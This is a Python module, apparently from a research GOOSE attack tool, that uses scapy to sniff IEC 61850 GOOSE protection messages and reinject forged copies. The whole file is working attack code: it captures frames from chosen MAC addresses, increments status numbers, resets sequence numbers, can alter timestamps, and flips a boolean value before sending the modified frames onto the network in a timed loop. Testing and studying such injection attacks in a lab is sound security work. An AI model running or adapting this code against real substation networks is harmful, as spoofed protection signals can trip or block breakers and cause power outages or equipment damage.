import scapy.all as scapy
import logging
import time
import GAT_Main_20230712 as Main
from multiprocessing import Process, Pipe

def sniffed(packet): #Main method
    global dst_aux
    global src_aux
    global flag
    global save_packet
    global dict_time
    global attack_time
    global current_time
    global execution_time
    global start_time
    global data_values
    global burst
    global initial_packet
    global modified_packet
    global initial_status
    global aux_sequence_number

    dict_tags = {}
    check_MAC = Main.filter_MAC(packet.dst,packet.src,dst_aux,src_aux) #Verify MAC of interest

    aux_number = None
    
    try:
        if (check_MAC==True):
                new_load = None
                previous_load, working_load = Main.separation_load(packet) #Separate packet load
                reserved = Main.check_reserved(previous_load) #Check if reserved field is modified
                if (reserved == False):
                        dict_tags = Main.dict_separation(working_load) #Classificate tags of packet
                        if (attack_time == 0):
                                attack_time, dict_time = Main.interval_time_5(dict_tags, packet, dict_time, attack_time) #Calculate interval between packets
                        if (save_packet == 1):
                                Main.packet_capture(packet,option_selected,flag) #Save packet in pcap file
                        aux_sequence_number = 0
                        while (attack_time != 0):
                                new_load = None
                                aux_status = tuple([i for i in dict_tags if i[1] == b'\x85'])
                                aux_status = aux_status[0]
                                actual_status = (int.from_bytes(dict_tags.get(
                                        aux_status)[1:], byteorder="big")) #Get status number
                                if (aux_number == None):
                                        aux_number = (int.from_bytes(dict_tags.get(
                                        aux_status)[1:], byteorder="big"))+1 #Add 1 to status number
                                else:
                                        aux_number = (int.from_bytes(dict_tags.get(
                                        aux_status)[1:], byteorder="big"))
                                new_status = aux_number.to_bytes(dict_tags.get(aux_status)[0], byteorder='big')  #Convert status number value to bytes
                                aux = int.to_bytes(dict_tags.get(aux_status)[0],1,'big')
                                dict_tags[aux_status]=aux+new_status #Set status number

                                aux_sequence = tuple([i for i in dict_tags if i[1]==b'\x86'])
                                aux_sequence = aux_sequence[0]
                                new_sequence = aux_sequence_number.to_bytes(dict_tags.get(aux_sequence)[0], byteorder='big')
                                aux = int.to_bytes(dict_tags.get(aux_sequence)[0],1,'big')
                                dict_tags[aux_sequence]=aux+new_sequence #Set sequence number

                                if (initial_packet == None): #Set of initial variables in first iteration
                                        initial_packet = packet
                                        initial_status = actual_status
                                        aux_date = tuple([i for i in dict_tags if i[1] == b'\x84'])
                                        aux_date = aux_date[0]
                                        aux_date_change = dict_tags.get(
                                        aux_date)[3]+0 #Change the +0 to +14 can add an hour in the date
                                        value = dict_tags[aux_date][:3] + \
                                        aux_date_change.to_bytes(1, 'big')+dict_tags[aux_date][4:]
                                        dict_tags[aux_date] = value

                                        try:
                                                aux_data = tuple([i for i in dict_tags if i[1]==b'\xab']) #Get data field
                                                aux_data = aux_data[0]
                                                data = dict_tags.get(aux_data)[1:]
                                                tag_bool = data.index(b'\x83') #Get bool objetive
                                                if(data[tag_bool+1]==1): #Change bool
                                                        if(data[tag_bool+2]==0):
                                                                bool_insert = 1
                                                                new_bool = bool_insert.to_bytes(data[tag_bool+1],byteorder='big')
                                                                data=data[:tag_bool+2]+new_bool+data[tag_bool+3:]
                                                        elif(data[tag_bool+2]==1):
                                                                bool_insert = 0
                                                                new_bool = bool_insert.to_bytes(data[tag_bool+1],byteorder='big')
                                                                data=data[:tag_bool+2]+new_bool+data[tag_bool+3:]
                                                        else:
                                                                bool_insert = data[tag_bool+2]
                                                aux = int.to_bytes(dict_tags.get(aux_data)[0],1,'big')
                                                dict_tags[aux_data]=aux+data #Set injection data value
                                        except Exception as e:
                                                print(repr(e))
                                                logging.exception('Exception')
                                                raise

                                aux_sequence = tuple([i for i in dict_tags if i[1]==b'\x86'])
                                aux_sequence = aux_sequence[0]
                                aux_number = 0
                                if (flag == 1):
                                        previous_reserved = Main.flags_reserved(previous_load,option_selected) #Set reserved field
                                        new_load = previous_reserved
                                elif (flag == 0):
                                        new_load = previous_load
                                if (start_time == 0):
                                        start_time = time.time()
                                if (current_time == 0 or (current_time-start_time) < execution_time):
                                        current_time = time.time()
                                        #Start preparation of multiprocessing
                                        aux_data_values = (*data_values,option_selected,attack_time,initial_status)
                                        side_A, side_B = Pipe(duplex=True) #Define conection to multiprocessing
                                        watcher = Process(target=Main.watcher_burst, args=(aux_data_values,side_B,)) #Define arguments of multiprocessing method 
                                        watcher.start() #Start multiprocessing
                                        at1 = time.time() #Set initial time multiprocessing
                                        at2 = time.time() #Set counter time of multiprocessing
                                        while((burst == [] or burst[0] == False) and at2-at1<attack_time): #Watch if burst is raised
                                                if (side_A.poll(0.1)): #Waited time
                                                        burst = side_A.recv()
                                                at2 = time.time()
                                        if (burst != [] and burst[0] == True): #Burst catched
                                                aux_number = (int.from_bytes(burst[1], byteorder="big"))+1 #Add 1 to status number
                                                initial_status = (int.from_bytes(burst[1], byteorder="big"))
                                                new_status = aux_number.to_bytes(dict_tags.get(aux_status)[0], byteorder='big')
                                                aux = int.to_bytes(dict_tags.get(aux_status)[0],1,'big')
                                                dict_tags[aux_status]=aux+new_status #Set new status number

                                                aux_sequence_number = 0 #Reset counter of sequence number
                                                new_sequence = aux_sequence_number.to_bytes(dict_tags.get(aux_sequence)[0], byteorder='big') #new sequence number reseted to 0
                                                aux = int.to_bytes(dict_tags.get(aux_sequence)[0],1,'big')
                                                dict_tags[aux_sequence]=aux+new_sequence #Set new sequence number

                                                aux_date = tuple([i for i in dict_tags if i[1]==b'\x84'])
                                                aux_date = aux_date[0]
                                                aux = int.to_bytes(dict_tags.get(aux_date)[0], 1, 'big')
                                                dict_tags[aux_date] = aux+burst[-1] #Set new date

                                                aux_date_change = dict_tags.get(
                                                        aux_date)[3]+0 #Change the +0 to +14 can add an hour in the date
                                                value = dict_tags[aux_date][:3] + \
                                                        aux_date_change.to_bytes(1, 'big')+dict_tags[aux_date][4:]
                                                dict_tags[aux_date] = value

                                        if (flag == 1):
                                                previous_reserved = Main.flags_reserved(previous_load,option_selected) #Set reserved field
                                                new_load = previous_reserved
                                        elif (flag == 0):
                                                new_load = previous_load

                                        for j in dict_tags: #Encapsulate of the package
                                                new_load += j[1]+dict_tags.get(j)
                                        packet.load = new_load

                                        scapy.sendp(packet, iface='eno1') #Send the modify packet to the network
                                        
                                        watcher.terminate() #Stop multiprocessing

                                        if (save_packet == 1):
                                                Main.packet_capture(packet,option_selected,flag) #Save packet in pcap file
                                        if (modified_packet == None):
                                                modified_packet = packet
                                        current_time = time.time()
                                        print(f'Elapsed time = {current_time-start_time}', flush = True)
                                        burst = [] #Reset burst value
                                        aux_sequence_number += 1 #Add 1 to counter sequence number
                                if ((current_time-start_time) >= execution_time):
                                        raise KeyboardInterrupt
                                        
    except Exception as e:
        # print(repr(e))
        if(str(e)=="int too big to convert"):
                logging.exception('Exception')
                print(f'Source = {packet.src} Destination = {packet.dst} \n {packet.show}')
                print(aux_number)
                time.sleep(5)
                raise
        elif(str(e)!='type'):
                logging.exception('Exception')
                print(repr(e))
                raise
        else:
                pass
                        
def start(values,option): #Set initial values
    global dst_aux
    dst_aux = values[0]
    global src_aux
    src_aux = values[1]
    global flag
    flag = values[2]
    global save_packet
    save_packet = values[3]
    global execution_time
    execution_time = values[4]
    global data_values
    data_values = values
    global burst
    burst = []
    global option_selected
    option_selected = option

    global initial_packet
    initial_packet = None
    global modified_packet
    modified_packet = None
    global data
    data = None
    global initial_status
    initial_status = 1
    global aux_sequence_number
    aux_sequence_number = 0

    global dict_time
    global attack_time
    global current_time
    global start_time
    
    start_time = 0
    dict_time = {}
    attack_time = 0
    current_time = 0

    scapy.sniff(iface='eno1', store = 0, lfilter=Main.filter_GOOSE, prn=sniffed, timeout = execution_time+60) #Start Scapy capture